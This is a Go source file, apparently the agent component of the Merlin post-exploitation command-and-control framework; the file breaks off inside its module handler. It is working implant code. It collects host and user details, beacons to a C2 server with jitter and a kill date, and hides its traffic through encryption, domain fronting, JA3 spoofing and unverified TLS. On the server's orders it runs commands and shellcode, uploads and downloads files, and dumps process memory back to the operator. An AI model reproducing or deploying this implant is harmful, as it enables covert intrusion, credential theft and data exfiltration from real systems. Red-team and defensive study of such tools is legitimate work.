// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"bytes"
	cryptorand "crypto/rand"
	"crypto/rsa"
	"crypto/sha1" // #nosec G505
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Ne0nd0g/ja3transport"
	// 3rd Party
	"github.com/cretz/gopaque/gopaque"
	"github.com/fatih/color"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/http3"
	"github.com/satori/go.uuid"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/net/http2"
	"gopkg.in/square/go-jose.v2"
	"gopkg.in/square/go-jose.v2/jwt"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/opaque"
)

// GLOBAL VARIABLES
var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time

type merlinClient interface {
	Do(req *http.Request) (*http.Response, error)
	Get(url string) (resp *http.Response, err error)
	Head(url string) (resp *http.Response, err error)
	Post(url, contentType string, body io.Reader) (resp *http.Response, err error)
}

//TODO this is a duplicate with agents/agents.go, centralize

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID            uuid.UUID       // ID is a Universally Unique Identifier per agent
	Platform      string          // Platform is the operating system platform the agent is running on (i.e. windows)
	Architecture  string          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	UserName      string          // UserName is the username that the agent is running as
	UserGUID      string          // UserGUID is a Globally Unique Identifier associated with username
	HostName      string          // HostName is the computer's host name
	Ips           []string        // Ips is a slice of all the IP addresses assigned to the host's interfaces
	Pid           int             // Pid is the Process ID that the agent is running under
	iCheckIn      time.Time       // iCheckIn is a timestamp of the agent's initial check in time
	sCheckIn      time.Time       // sCheckIn is a timestamp of the agent's last status check in time
	Version       string          // Version is the version number of the Merlin Agent program
	Build         string          // Build is the build number of the Merlin Agent program
	WaitTime      time.Duration   // WaitTime is how much time the agent waits in-between checking in
	PaddingMax    int             // PaddingMax is the maximum size allowed for a randomly selected message padding length
	MaxRetry      int             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	FailedCheckin int             // FailedCheckin is a count of the total number of failed check ins
	Skew          int64           // Skew is size of skew added to each WaitTime to vary check in attempts
	Verbose       bool            // Verbose enables verbose messages to standard out
	Debug         bool            // Debug enables debug messages to standard out
	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
	Client        *merlinClient   // Client is an interface for clients to make connections for agent communications
	UserAgent     string          // UserAgent is the user agent string used with HTTP connections
	initial       bool            // initial identifies if the agent has successfully completed the first initial check in
	KillDate      int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
	RSAKeys       *rsa.PrivateKey // RSA Private/Public key pair; Private key used to decrypt messages
	PublicKey     rsa.PublicKey   // Public key (of server) used to encrypt messages
	secret        []byte          // secret is used to perform symmetric encryption operations
	JWT           string          // Authentication JSON Web Token
	URL           string          // The C2 server URL
	Host          string          // HTTP Host header, typically used with Domain Fronting
	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
	psk           string          // Pre-Shared Key
	JA3           string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
	inChan        chan jobs.Job   // A channel of input jobs for the agent to handle
	outChan       chan jobs.Job   // A channel of output job results for the agent to send back to the server
}

// New creates a new agent struct with specific values and returns the object
func New(protocol string, url string, host string, psk string, proxy string, ja3 string, verbose bool, debug bool) (Agent, error) {
	if debug {
		message("debug", "Entering agent.New function")
	}
	a := Agent{
		ID:           uuid.NewV4(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		Version:      merlin.Version,
		WaitTime:     30000 * time.Millisecond,
		PaddingMax:   4096,
		MaxRetry:     7,
		Skew:         3000,
		Verbose:      verbose,
		Debug:        debug,
		Proto:        protocol,
		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
		initial:      false,
		KillDate:     0,
		URL:          url,
		Host:         host,
		JA3:          ja3,
		inChan:       make(chan jobs.Job, 100),
		outChan:      make(chan jobs.Job, 100),
	}

	rand.Seed(time.Now().UnixNano())

	u, errU := user.Current()
	if errU != nil {
		return a, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
	}

	a.UserName = u.Username
	a.UserGUID = u.Gid

	h, errH := os.Hostname()
	if errH != nil {
		return a, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
	}

	a.HostName = h

	interfaces, errI := net.Interfaces()
	if errI != nil {
		return a, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				a.Ips = append(a.Ips, addr.String())
			}
		} else {
			return a, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
		}
	}

	var errClient error

	a.Client, errClient = getClient(a.Proto, proxy, a.JA3)

	if errClient != nil {
		return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
	}

	// Generate a random password and run it through 5000 iterations of PBKDF2; Used with OPAQUE
	x := core.RandStringBytesMaskImprSrc(30)
	a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)

	// Set encryption secret to pre-authentication pre-shared key
	a.psk = psk

	// Generate RSA key pair
	privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
	if rsaErr != nil {
		return a, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr)
	}

	a.RSAKeys = privateKey

	if a.Verbose {
		message("info", "Host Information:")
		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
		message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
		message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
		message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) //TODO A username like _svctestaccont causes error
		message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
		message("info", fmt.Sprintf("\tProxy: %v", proxy))
		message("info", fmt.Sprintf("\tJA3 Signature: %s", a.JA3))
	}
	if debug {
		message("debug", "Leaving agent.New function")
	}
	return a, nil
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run() error {
	rand.Seed(time.Now().UTC().UnixNano())

	if a.Verbose {
		message("note", fmt.Sprintf("Agent version: %s", merlin.Version))
		message("note", fmt.Sprintf("Agent build: %s", build))
	}

	// Start go routine that checks for jobs or tasks to execute
	go a.executeJob()

	for {
		// Check killdate to see if the agent should checkin
		if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
			if a.initial {
				if a.Verbose {
					message("note", "Checking in...")
				}
				a.statusCheckIn()
			} else {
				a.initial = a.initialCheckIn()
			}
			if a.FailedCheckin >= a.MaxRetry {
				return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
			}
		} else {
			return fmt.Errorf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339))
		}

		timeSkew := time.Duration(0)

		if a.Skew > 0 {
			timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond // #nosec G404 - Does not need to be cryptographically secure, deterministic is OK
		}

		totalWaitTime := a.WaitTime + timeSkew

		if a.Verbose {
			message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
		}
		time.Sleep(totalWaitTime)
	}
}

// initialCheckin is the function that runs when an agent is first started to complete registration and authentication
func (a *Agent) initialCheckIn() bool {

	if a.Debug {
		message("debug", "Entering initialCheckIn function")
	}

	// Register
	errOPAQUEReg := a.opaqueRegister()
	if errOPAQUEReg != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", errOPAQUEReg.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}

	// Authenticate
	errOPAQUEAuth := a.opaqueAuthenticate()
	if errOPAQUEAuth != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", errOPAQUEAuth.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}

	// Force a status checkin to send the AgentInfo job that _should_ be in the channel
	a.statusCheckIn()

	if a.Debug {
		message("debug", "Leaving initialCheckIn function, returning True")
	}
	a.iCheckIn = time.Now().UTC()
	return true
}

// statusCheckIn is the function that agent runs at every sleep/skew interval to check in with the server for jobs
func (a *Agent) statusCheckIn() {
	if a.Debug {
		message("debug", "Entering into agent.statusCheckIn()")
	}

	msg := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Check the output channel
	var jobs []jobs.Job
	for {
		if len(a.outChan) > 0 {
			job := <-a.outChan
			jobs = append(jobs, job)
		} else {
			break
		}
	}

	if len(jobs) > 0 {
		msg.Type = messages.JOBS
		msg.Payload = jobs
	} else {
		msg.Type = messages.CHECKIN
	}

	j, reqErr := a.sendMessage("POST", msg)

	if reqErr != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", reqErr.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}

		// Put the jobs back into the queue if there was an error
		if msg.Type == messages.JOBS {
			for _, job := range jobs {
				a.outChan <- job
			}
		}
		// Handle HTTP3 Errors
		if a.Proto == "http3" {
			e := ""
			n := false

			// Application error 0x0 is typically the result of the server sending a CONNECTION_CLOSE frame
			if strings.Contains(reqErr.Error(), "Application error 0x0") {
				n = true
				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
			}

			// Handshake timeout happens when a new client was not able to reach the server and setup a crypto handshake for the first time (no listener or no access)
			if strings.Contains(reqErr.Error(), "NO_ERROR: Handshake did not complete in time") {
				n = true
				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
			}

			// No recent network activity happens when a PING timeout occurs.  KeepAlive setting can be used to prevent MaxIdleTimeout
			// When the client has previously established a crypto handshake but does not hear back from it's PING frame the server within the client's MaxIdleTimeout
			// Typically happens when the Merlin Server application is killed/quit without sending a CONNECTION_CLOSE frame from stopping the listener
			if strings.Contains(reqErr.Error(), "NO_ERROR: No recent network activity") {
				n = true
				e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
			}

			if a.Debug {
				message("debug", fmt.Sprintf("HTTP/3 error: %s", reqErr.Error()))
			}

			if n {
				if a.Verbose {
					message("note", e)
				}
				var errClient error
				a.Client, errClient = getClient(a.Proto, "", "")
				if errClient != nil {
					message("warn", fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
				}
			}
		}
		return
	}

	a.FailedCheckin = 0
	a.sCheckIn = time.Now().UTC()

	if a.Debug {
		message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
		message("debug", fmt.Sprintf("Message Type: %s", messages.String(j.Type)))
		message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
	}

	// Handle message
	a.messageHandler(j)

}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or http3)
func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, error) {

	var m merlinClient

	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	// Proxy
	var proxy func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		rawURL, errProxy := url.Parse(proxyURL)
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
		}
		proxy = http.ProxyURL(rawURL)
	}

	// JA3
	if ja3 != "" {
		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
		if errJA3 != nil {
			return &m, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
		}
		tr, err := ja3transport.NewTransportInsecure(ja3)
		if err != nil {
			return nil, err
		}

		// Set proxy
		if proxyURL != "" {
			tr.Proxy = proxy
		}

		JA3.Transport = tr

		m = JA3
		return &m, nil
	}

	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "http3":
		transport = &http3.RoundTripper{
			QuicConfig: &quic.Config{
				// Opted for a long timeout to prevent the client from sending a PING Frame
				// If MaxIdleTimeout is too high, agent will never get an error if the server is off line and will perpetually run without exiting because MaxFailedCheckins is never incremented
				//MaxIdleTimeout: time.Until(time.Now().AddDate(0, 42, 0)),
				MaxIdleTimeout: time.Second * 30,
				// KeepAlive will send a HTTP/2 PING frame to keep the connection alive
				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will timeout
				KeepAlive: true,
				// HandshakeTimeout is how long the client will wait to hear back while setting up the initial crypto handshake w/ server
				HandshakeTimeout: time.Second * 30,
			},
			TLSClientConfig: TLSConfig,
		}
	case "h2":
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		}
	case "https":
		if proxyURL != "" {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
				Proxy:           proxy,
			}
		} else {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
			}
		}
	case "http":
		if proxyURL != "" {
			transport = &http.Transport{
				MaxIdleConns: 10,
				Proxy:        proxy,
			}
		} else {
			transport = &http.Transport{
				MaxIdleConns: 10,
			}
		}
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	m = &http.Client{Transport: transport}
	return &m, nil
}

// sendMessage is a generic function to receive a messages.Base struct, encode it, encrypt it, and send it to the server
// The response message will be decrypted, decoded, and return a messages.Base struct.
func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
	if a.Debug {
		message("debug", "Entering into agent.sendMessage()")
	}
	if a.Verbose {
		message("note", fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), a.URL))
	}

	var returnMessage messages.Base

	// Convert messages.Base to gob
	messageBytes := new(bytes.Buffer)
	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
	if errGobEncode != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), errGobEncode.Error())
	}

	// Get JWE
	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), a.secret)
	if errJWE != nil {
		return returnMessage, errJWE
	}

	// Encode JWE into gob
	jweBytes := new(bytes.Buffer)
	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
	if errJWEBuffer != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", m.Type, errJWEBuffer.Error())
	}

	switch strings.ToLower(method) {
	case "post":
		req, reqErr := http.NewRequest("POST", a.URL, jweBytes)
		if reqErr != nil {
			return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		}

		if req != nil {
			req.Header.Set("User-Agent", a.UserAgent)
			req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.JWT))
			if a.Host != "" {
				req.Host = a.Host
			}
		}

		// Send the request
		var client merlinClient // Why do I need to prove that a.Client is merlinClient type?
		client = *a.Client
		if a.Debug {
			message("debug", fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, a.URL))
		}
		resp, err := client.Do(req)

		if err != nil {
			return returnMessage, fmt.Errorf("there was an error with the %s client while performing a POST:\r\n%s", a.Proto, err.Error())
		}
		if a.Debug {
			message("debug", fmt.Sprintf("HTTP Response:\r\n%+v", resp))
		}

		switch resp.StatusCode {
		case 200:
			break
		case 401:
			if a.Verbose {
				message("note", "server returned a 401, reAuthenticating orphaned agent")
			}
			// TODO Why don't I just start the re-authentication process now?
			msg := messages.Base{
				Version: 1.0,
				ID:      a.ID,
				Type:    messages.OPAQUE, // OPAQUE_RE_AUTH
				Payload: opaque.Opaque{
					Type: opaque.ReAuthenticate,
				},
			}
			return msg, err
		default:
			return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
		}

		contentType := resp.Header.Get("Content-Type")
		if contentType == "" {
			return returnMessage, fmt.Errorf("the response did not contain a Content-Type header")
		}

		// Check to make sure the response contains the application/octet-stream Content-Type header
		isOctet := false
		for _, v := range strings.Split(contentType, ",") {
			if strings.ToLower(v) == "application/octet-stream" {
				isOctet = true
			}
		}

		if !isOctet {
			return returnMessage, fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
		}

		// Check to make sure message response contained data
		// TODO Temporarily disabled length check for HTTP/3 connections https://github.com/lucas-clemente/quic-go/issues/2398
		if resp.ContentLength == 0 && a.Proto != "http3" {
			return returnMessage, fmt.Errorf("the response message did not contain any data")
		}

		var jweString string

		// Decode GOB from server response into JWE
		errD := gob.NewDecoder(resp.Body).Decode(&jweString)
		if errD != nil {
			return returnMessage, fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
		}

		// Decrypt JWE to messages.Base
		respMessage, errDecrypt := core.DecryptJWE(jweString, a.secret)
		if errDecrypt != nil {
			return returnMessage, errDecrypt
		}

		// Verify UUID matches
		if respMessage.ID != a.ID {
			if a.Verbose {
				return returnMessage, fmt.Errorf("response message agent ID %s does not match current ID %s", respMessage.ID.String(), a.ID.String())
			}
		}
		return respMessage, nil
	default:
		return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
	}
}

// messageHandler processes an input message from the server and adds it to the job channel for processing by the agent
func (a *Agent) messageHandler(m messages.Base) {
	if a.Debug {
		message("debug", "Entering into agent.messageHandler function")
	}
	if a.Verbose {
		message("success", fmt.Sprintf("%s message type received!", messages.String(m.Type)))
	}

	var results jobs.Results
	if a.ID != m.ID {
		results.Stderr = fmt.Sprintf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
		a.outChan <- jobs.Job{
			AgentID: a.ID,
			Type:    jobs.RESULT,
			Payload: results,
		}
		return
	}

	// Update the Agent's JWT
	if m.Token != "" {
		a.JWT = m.Token
	}

	switch m.Type {
	case messages.JOBS:
		for _, job := range m.Payload.([]jobs.Job) {
			// If the job belongs to this agent
			if job.AgentID == a.ID {
				if a.Verbose {
					message("success", fmt.Sprintf("%s job type received!", jobs.String(job.Type)))
				}
				switch job.Type {
				case jobs.FILETRANSFER:
					a.inChan <- job
				case jobs.CMD:
					a.inChan <- job
				case jobs.MODULE:
					a.inChan <- job
				case jobs.CONTROL:
					// Intend for Agent Control messages to block and not use the input job channel
					//a.inChan <- job
					a.agentControl(job)
				case jobs.SHELLCODE:
					if a.Verbose {
						message("note", "Received Execute shellcode command")
					}
					a.inChan <- job
				case jobs.NATIVE:
					if job.Payload.(jobs.Command).Command == "agentInfo" {
						a.getAgentInfoMessage(job)
					} else {
						a.inChan <- job
					}
				default:
					var results jobs.Results
					results.Stderr = fmt.Sprintf("%s is not a valid message type", messages.String(m.Type))
					a.outChan <- jobs.Job{
						ID:      job.ID,
						AgentID: a.ID,
						Token:   job.Token,
						Type:    jobs.RESULT,
						Payload: results,
					}
				}
			} else {
				// If the job belongs to a linked agent
				// NOT IMPLEMENTED YET
			}
		}
	case messages.IDLE:
		if a.Verbose {
			message("note", "Received idle command, doing nothing")
		}
	case messages.OPAQUE:
		if m.Payload.(opaque.Opaque).Type == opaque.ReAuthenticate {
			err := a.opaqueAuthenticate()
			if err != nil {
				a.FailedCheckin++
				results.Stderr = err.Error()
				a.outChan <- jobs.Job{
					AgentID: a.ID,
					Type:    jobs.RESULT,
					Payload: results,
				}
			}
		}
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid message type", messages.String(m.Type))
		a.outChan <- jobs.Job{
			AgentID: a.ID,
			Type:    jobs.RESULT,
			Payload: results,
		}
	}

	if a.Debug {
		message("debug", "Leaving agent.messageHandler function without error")
	}
}

// executeJob is executed a go routine that regularly checks for jobs from the in channel, executes them, and returns results to the out channel
func (a *Agent) executeJob() {
	for {
		job := <-a.inChan
		switch job.Type {
		case jobs.CMD:
			a.executeCommand(job)
		case jobs.CONTROL:
			a.agentControl(job)
		case jobs.FILETRANSFER:
			a.fileTransfer(job)
		case jobs.MODULE:
			a.runModule(job)
		case jobs.NATIVE:
			a.nativeCommand(job)
		case jobs.SHELLCODE:
			a.executeShellcode(job)
		default:
			result := jobs.Results{Stderr: fmt.Sprintf("Invalid job type: %d", job.Type)}
			a.outChan <- jobs.Job{
				AgentID: a.ID,
				ID:      job.ID,
				Type:    jobs.RESULT,
				Payload: result,
			}
		}
	}
}

// executeCommand runs the provided input program and arguments, returning results in a message base
func (a *Agent) executeCommand(job jobs.Job) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %+v", job))

	}
	cmd := job.Payload.(jobs.Command)
	if a.Verbose {
		message("success", fmt.Sprintf("Executing command: %s %s", cmd.Command, cmd.Args))
	}

	var results jobs.Results
	results.Stdout, results.Stderr = ExecuteCommand(cmd.Command, cmd.Args)

	if a.Verbose {
		if results.Stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s %s", cmd.Command, cmd.Args))
			message("success", results.Stdout)
			message("warn", fmt.Sprintf("Error: %s", results.Stderr))

		} else {
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", results.Stdout))
		}
	}

	a.outChan <- jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.RESULT,
		Payload: results,
	}
}

// fileTransfer executes the file transfer job and returns results to job channel
func (a *Agent) fileTransfer(job jobs.Job) {
	var result jobs.Results
	transfer := job.Payload.(jobs.FileTransfer)
	// Agent will be downloading a file from the server
	if transfer.IsDownload {
		if a.Verbose {
			message("note", "FileTransfer type: Download")
		}

		_, directoryPathErr := os.Stat(filepath.Dir(transfer.FileLocation))
		if directoryPathErr != nil {
			result.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
				"directory %s:\r\n", transfer.FileLocation)
			result.Stderr += directoryPathErr.Error()
		}
		if result.Stderr == "" {
			if a.Verbose {
				message("note", fmt.Sprintf("Writing file to %s", transfer.FileLocation))
			}
			downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(transfer.FileBlob)
			if downloadFileErr != nil {
				result.Stderr = downloadFileErr.Error()
			} else {
				errF := ioutil.WriteFile(transfer.FileLocation, downloadFile, 0600)
				if errF != nil {
					result.Stderr = errF.Error()
				} else {
					result.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", transfer.FileLocation, a.ID.String())
				}
			}
		}
		a.outChan <- jobs.Job{
			ID:      job.ID,
			AgentID: a.ID,
			Type:    jobs.RESULT,
			Payload: result,
		}
		return
	}

	// Agent will uploading a file to the server
	if a.Verbose {
		message("note", "FileTransfer type: Upload")
	}

	fileData, fileDataErr := ioutil.ReadFile(transfer.FileLocation)
	if fileDataErr != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error reading %s", transfer.FileLocation))
			message("warn", fileDataErr.Error())
		}
		result.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", transfer.FileLocation, fileDataErr.Error())
	} else {
		fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
		_, errW := io.WriteString(fileHash, string(fileData))
		if errW != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
			}
		}

		if a.Verbose {
			message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
				transfer.FileLocation,
				len(fileData),
				fileHash.Sum(nil)))
		}
		ft := jobs.FileTransfer{
			FileLocation: transfer.FileLocation,
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
			IsDownload:   true,
		}

		a.outChan <- jobs.Job{
			ID:      job.ID,
			AgentID: a.ID,
			Token:   job.Token,
			Type:    jobs.FILETRANSFER,
			Payload: ft,
		}
		return
	}
	a.outChan <- jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.RESULT,
		Payload: result,
	}
}

// nativeCommand executes a golang native command that does not use any executables on the host
func (a *Agent) nativeCommand(job jobs.Job) {
	var results jobs.Results
	cmd := job.Payload.(jobs.Command)
	if a.Verbose {
		message("note", fmt.Sprintf("Executing native command: %s", cmd.Command))
	}
	switch cmd.Command {
	// TODO create a function for each Native Command that returns a string and error and DOES NOT use (a *Agent)
	case "agentInfo":
		a.getAgentInfoMessage(job)
	case "ls":
		listing, err := a.list(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
			break
		}
		results.Stdout = listing
	case "cd":
		err := os.Chdir(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
		} else {
			path, pathErr := os.Getwd()
			if pathErr != nil {
				results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
			} else {
				results.Stdout = fmt.Sprintf("Changed working directory to %s", path)
			}
		}
	case "pwd":
		dir, err := os.Getwd()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
		} else {
			results.Stdout = fmt.Sprintf("Current working directory: %s", dir)
		}
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", cmd.Command)
	}
	if a.Verbose {
		if results.Stderr == "" {
			message("success", results.Stdout)

		} else {
			message("warn", results.Stderr)
		}
	}
	a.outChan <- jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.RESULT,
		Payload: results,
	}
}

// runModule parsed the module message type and executes the corresponding extended module
func (a *Agent) runModule(job jobs.Job) {
	cmd := job.Payload.(jobs.Command)
	if a.Verbose {
		message("note", fmt.Sprintf("Executing module: %s", cmd.Command))
	}

	var results jobs.Results

	switch cmd.Command {
	case "CreateProcess":
		//ensure the provided args are valid
		if len(cmd.Args) < 2 {
			//not enough args
			results.Stderr = "not enough arguments provided to the createProcess module to dump a process"
			break
		}
		var err error
		// 1. Shellcode
		// 2. SpawnTo Executable
		// 3. SpawnTo Arguments
		results.Stdout, results.Stderr, err = ExecuteShellcodeCreateProcessWithPipe(cmd.Args[0], cmd.Args[1], cmd.Args[2])
		if err != nil {
			results.Stderr = err.Error()
		}
	case "Minidump":
		if a.Verbose {
			message("note", "Received Minidump request")
		}

		//ensure the provided args are valid
		if len(cmd.Args) < 2 {
			//not enough args
			results.Stderr = "not enough arguments provided to the Minidump module to dump a process"
			break
		}
		process := cmd.Args[0]
		pid, err := strconv.ParseInt(cmd.Args[1], 0, 32)
		if err != nil {
			results.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", cmd.Args[1], err.Error())
			break
		}

		tempPath := ""
		if len(cmd.Args) == 3 {
			tempPath = cmd.Args[2]
		}

		// Get minidump
		miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))

		//copied and pasted from upload func, modified appropriately
		if miniDumpErr != nil {
			results.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
				miniDumpErr.Error())
		} else {
			fileHash := sha256.New()
			_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
			if errW != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
				}
			}

			if a.Verbose {
				message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
					len(miniD["FileContent"].([]byte)),
					fileHash.Sum(nil)))
			}
			fileTransferMessage := jobs.FileTransfer{
				FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
				FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
				IsDownload:   true,
			}
			a.outChan <- jobs.Job{
				ID:      job.ID,
				AgentID: a.ID,
				Token:   job.Token,
				Type:    jobs.FILETRANSFER,
				Payload: fileTransferMessage,
			}
			return
		}
	default:
